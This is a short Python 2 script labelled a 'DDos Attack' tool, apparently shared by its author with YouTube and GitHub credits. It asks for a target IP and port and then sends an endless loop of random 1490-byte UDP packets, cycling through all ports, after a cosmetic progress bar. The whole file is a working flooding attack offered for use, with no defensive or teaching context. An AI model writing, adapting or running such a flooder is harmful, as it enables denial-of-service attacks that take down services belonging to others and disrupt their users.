import sys
import os
import time
import socket
import random
#KHAR TIME
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("/kHar\ DDos Attack Py")
print
print "Author   : kHar#1355"
print "You Tube : https://www.youtube.com/c/khar"
print "Github   : khar-mobile" 
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("/kHar\ Attack Starting")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "/kHar\ Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

